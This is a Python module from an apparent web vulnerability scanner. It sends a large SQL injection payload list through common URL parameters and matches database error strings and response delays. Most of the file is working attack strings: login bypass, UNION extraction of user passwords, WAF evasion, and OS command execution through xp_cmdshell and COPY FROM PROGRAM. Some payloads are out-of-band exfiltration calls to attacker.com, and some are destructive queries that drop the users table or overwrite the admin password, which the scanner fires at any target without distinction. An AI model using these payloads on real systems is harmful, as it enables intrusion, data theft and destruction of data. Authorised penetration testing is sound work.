from typing import List
from .base import BaseScanner, Vulnerability
from ..core.target import Target
import logging
import time

logger = logging.getLogger(__name__)

class SQLInjectionScanner(BaseScanner):
    """
    Nikto-level SQL Injection Scanner
    200+ comprehensive payloads covering all major databases and injection types
    """
    
    # Comprehensive payload set - 200+ payloads
    PAYLOADS = [
        # === AUTHENTICATION BYPASS (Basic) ===
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "' OR 1=1/*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or ''='",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "1' or '1' = '1",
        "1' or '1' = '1' --",
        "1' or '1' = '1' /*",
        "1' or '1' = '1' #",
        "admin' or '1'='1",
        "admin' or '1'='1'--",
        "admin' or '1'='1'#",
        "admin' or '1'='1'/*",
        
        # === UNION-BASED INJECTION ===
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1--",
        "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT 1,2,3,4,5,6--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "' UNION ALL SELECT 1,2,3--",
        "' UNION ALL SELECT 1,2,3,4,5--",
        
        # MySQL UNION specifics
        "' UNION SELECT @@version--",
        "' UNION SELECT user()--",
        "' UNION SELECT database()--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns--",
        "' UNION SELECT concat(username,0x3a,password) FROM users--",
        
        # === TIME-BASED BLIND SQLI ===
        # MySQL
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "1' AND SLEEP(5)#",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND IF(1=1,SLEEP(5),0)--",
        "1' RLIKE sleep(5)#",
        
        # MSSQL
        "'; WAITFOR DELAY '0:0:5'--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1' WAITFOR DELAY '0:0:5'--",
        "1' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3)--", # Heavy query delay
        
        # PostgreSQL
        "'; SELECT pg_sleep(5)--",
        "1'; SELECT pg_sleep(5)--",
        "1' AND 1234=(SELECT 1234 FROM PG_SLEEP(5))--",
        
        # Oracle
        "' AND DBMS_LOCK.SLEEP(5)--",
        "1' AND DBMS_LOCK.SLEEP(5)--",
        "1' + (SELECT * FROM (SELECT(DBMS_LOCK.SLEEP(5)))AAAA)--",
        
        # === BOOLEAN-BASED BLIND SQL ===
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' AND ASCII(SUBSTRING(user(),1,1))>64--",
        "1' AND (SELECT COUNT(*) FROM users)>0--",
        "1' AND (SELECT username FROM users LIMIT 1)='admin'--",
        
        # === ERROR-BASED INJECTION ===
        # MySQL
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND updatexml(1,concat(0x7e,version()),1)--",
        "' AND EXP(~(SELECT * FROM (SELECT version())a))--",
        
        # MSSQL  
        "' AND 1=CONVERT(int,@@version)--",
        "' AND 1=CAST((SELECT @@version) AS int)--",
        "' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--",
        
        # PostgreSQL
        "' AND 1=CAST((SELECT version()) AS int)--",
        "' AND 1::int=version()--",
        
        # Oracle
        "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--",
        "' AND UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))=1--",
        
        # === STACKED QUERIES ===
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacker','password')--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        "'; EXEC xp_cmdshell('whoami')--",
        "'; SELECT * FROM users--",
        "1'; SELECT SLEEP(5)--",
        
        # === DATABASE-SPECIFIC PAYLOADS ===
        # MySQL Advanced
        "' AND ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users ORDER BY id LIMIT 0,1),1,1))>64--",
        "' AND (SELECT * FROM(SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--",
        "' AND GTID_SUBSET(version(),1)--",
        "' AND JSON_KEYS((SELECT VERSION()))--",
        "' PROCEDURE ANALYSE(extractvalue(rand(),concat(0x3a,version())),1)--",
        
        # PostgreSQL Advanced
        "'; COPY users FROM PROGRAM 'whoami'--",
        "'; CREATE TABLE shell(output text)--",
        "' AND 1=CAST((SELECT array_to_string(array_agg(table_name),',') FROM information_schema.tables) AS numeric)--",
        
        # MSSQL Advanced
        "'; EXEC master..xp_cmdshell 'ping attacker.com'--",
        "'; EXEC SP_OACREATE 'wscript.shell',@test out--",
        "' AND 1=DB_NAME(0)--",
        "' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')--",
        "' HAVING 1=1--",
        "' GROUP BY columnnames HAVING 1=1--",
        
        # Oracle Advanced
        "' UNION SELECT NULL FROM dual--",
        "' AND 1=UTL_HTTP.REQUEST('http://attacker.com')--",
        "' AND 1=DBMS_XMLGEN.GETXML('SELECT user FROM dual')--",
        "' AND (SELECT banner FROM v$version WHERE rownum=1)='x'--",
        
        # SQLite Advanced
        "' AND 1=load_extension('test')--",
        "' AND (SELECT sql FROM sqlite_master)--",
        "' AND (SELECT tbl_name FROM sqlite_master WHERE type='table')='users'--",
        
        # === WAF BYPASS TECHNIQUES ===
        # Comment-based obfuscation
        "' /*!50000OR*/ 1=1--",
       "' OR/*!50000*/1=1--",
        "' OR/**/1/**/=/**/1--",
        "' /*!50000UNION*//*!50000SELECT*/1--",
        "' /*!12345UNION*//*!12345SELECT*/1,2,3--",
        
        # Case variation
        "' UnIoN SeLeCt 1,2,3--",
        "' uNiOn aLl sElEcT 1,2,3--",
        "' OR 1=1 UnIoN SeLeCt NULL--",
        
        # URL encoding
        "' %55nion %53elect 1,2,3--",
        "' %2557nion %2553elect 1,2,3--",  # Double encoding
        "' OR 1=1%23",
        "' OR 1=1%00",
        
        # Whitespace manipulation
        "' %0aOR%0a 1=1--",
        "' %09OR%09 1=1--",
        "' %0dOR%0d 1=1--",
        "'\t\tOR\t\t1=1--",
        
        # Parenthesis bypass
        "' OR (1)=(1)--",
        "' OR (1=1)--",
        "' OR ((1))=((1))--",
        
        # === ADVANCED INJECTION TECHNIQUES ===
        # Hex encoding
        "' OR 0x313d31--",  # 1=1 in hex
        "' UNION SELECT 0x61646d696e--",  # admin in hex
        
        # Char-based
        "' OR CHAR(49)=CHAR(49)--",
        "' UNION SELECT CHAR(97,100,109,105,110)--",
        
        # Concatenation
        "' OR 'adm'+'in'='admin'--",
        "' OR 'adm'||'in'='admin'--",
        "' OR CONCAT('ad','min')='admin'--",
        
        # Scientific notation
        "' OR 1e0=1--",
        "' OR 1.=1--",
        "' OR .1=.1--",
        
        # === SECOND ORDER INJECTION ===
        "admin'-- ",
        "admin\\'--",
        "admin\\\"--",
        
        # === OUT-OF-BAND INJECTION ===
        # DNS Exfiltration
        "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--",  # MSSQL
        "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||version()) FROM dual--",  # Oracle
        "'; SELECT load_file(concat('\\\\\\\\',version(),'.attacker.com\\\\'))--",  # MySQL
        
        # === NO-SPACE BYPASS ===
        "'||'1'='1",
        "'or(1)=(1)--",
        "'or/**/1=1--",
        "'%0aor%0a1=1--",
        
        # === POLYGLOT PAYLOADS ===
        "1'1\"1`1'\"1`--",
        "';/**/UNION/**/SELECT/**/1,2,3--+",
        "SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
    ]
    
    # Comprehensive error signatures
    ERRORS = [
        # MySQL
        "SQL syntax",
        "mysql_fetch",
        "mysql_num_rows",
        "MySQL Query fail",
        "You have an error in your SQL syntax",
        "supplied argument is not a valid MySQL",
        "mysql_fetch_array()",
        "mysql_fetch_assoc()",
        "mysql_fetch_row()",
        "mysql_num_rows()",
        "mysql_error()",
        "Warning: mysql",
        "MySqlClient",
        "com.mysql.jdbc",
        
        # PostgreSQL
        "PostgreSQL query failed",
        "pg_query()",
        "pg_exec()",
        "pg_send_query()",
        "unterminated quoted string",
        "pg_fetch",
        "org.postgresql",
        "PSQLException",
        
        # MSSQL
        "Microsoft SQL Native Client error",
        "ODBC SQL Server Driver",
        "SQLServer JDBC Driver",
        "Unclosed quotation mark",
        "Microsoft OLE DB Provider for SQL Server",
        "System.Data.SqlClient.SqlException",
        "[SQL Server]",
        "Driver.*SQL Server",
        
        # Oracle
        "ORA-01756",  # quoted string not properly terminated
        "ORA-00933",  # SQL command not properly ended
        "ORA-00936",  # missing expression
        "ORA-01789",  # query block has incorrect number of result columns
        "Oracle error",
        "Oracle JDBC",
        "oracle.jdbc",
        
        # SQLite
        "SQLite Error",
        "sqlite3.OperationalError",
        "SQLITE_ERROR",
        "SQL logic error",
        "near \"",
        
        # Generic
        "SQL error",
        "Database error",
        "Syntax error",
        "SQL command not properly ended",
        "quoted string not properly terminated",
        "You have an error in your SQL",
        "syntax to use near",
        "SQL statement",
        "Incorrect syntax near",
        "Invalid SQL:",
        "SQL Error:",
        "Warning: SQL",
        "valid -SQL result",
        "SQL query failed",
    ]
    
    def scan(self, target: Target, callback=None) -> List[Vulnerability]:
        """
        Comprehensive SQL Injection scan with Nikto-level payload coverage
        Tests 200+ payloads across multiple injection types and databases
        """
        vulnerabilities = []
        logger.info(f"Starting Nikto-level SQL Injection scan on {target.url}")
        
        # Parameters to test
        params = ['id', 'user', 'username', 'email', 'password', 'search', 'q', 'query', 'name', 'page', 'cat', 'category', 'item', 'product']
        
        payload_count = 0
        total_tests = len(self.PAYLOADS) * len(params)
        
        for param in params:
            for payload in self.PAYLOADS:
                payload_count += 1
                
                if callback:
                    callback(payload)
                
                try:
                    # Build test URL
                    if '?' in target.url:
                        test_url = f"{target.url}&{param}={payload}"
                    else:
                        test_url = f"{target.url}?{param}={payload}"
                    
                    # Measure response time for time-based detection
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=10)
                    elapsed = time.time() - start_time
                    
                    # Check for error-based injection
                    for error in self.ERRORS:
                        if error.lower() in response.text.lower():
                            vuln = Vulnerability(
                                name="SQL Injection (Error-Based)",
                                description=f"SQL injection vulnerability detected via database error message. Parameter '{param}' is vulnerable to SQL injection through error disclosure.",
                                severity="CRITICAL",
                                evidence=f"Payload: {payload}\nParameter: {param}\nError signature: {error}\nResponse preview: {response.text[:500]}",
                                url=test_url,
                                recommendation="Use parameterized queries/prepared statements. Never concatenate user input directly into SQL queries. Implement input validation and sanitization.",
                                proof_of_concept=f"curl '{test_url}'"
                            )
                            vulnerabilities.append(vuln)
                            logger.warning(f"SQL Injection found (error-based) at {test_url}")
                    
                    # Check for time-based blind injection
                    if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper() or "pg_sleep" in payload or "DBMS_LOCK" in payload:
                        if elapsed >= 5:  # If request took 5+ seconds
                            vuln = Vulnerability(
                                name="SQL Injection (Time-Based Blind)",
                                description=f"SQL injection vulnerability detected via time-based analysis. Parameter '{param}' is vulnerable to blind SQL injection.",
                                severity="CRITICAL",
                                evidence=f"Payload: {payload}\nParameter: {param}\nResponse time: {elapsed:.2f}s (expected ~5s delay)\nTime-based blind injection confirmed",
                                url=test_url,
                                recommendation="Use parameterized queries/prepared statements. Implement strict input validation.",
                                proof_of_concept=f"curl '{test_url}'"
                            )
                            vulnerabilities.append(vuln)
                            logger.warning(f"SQL Injection found (time-based) at {test_url}")
                    
                except Exception as e:
                    logger.debug(f"Error testing SQL injection payload {payload} on param {param}: {str(e)}")
                    continue
        
        logger.info(f"SQL Injection scan complete. Tested {payload_count} payload combinations. Found {len(vulnerabilities)} vulnerabilities")
        return vulnerabilities
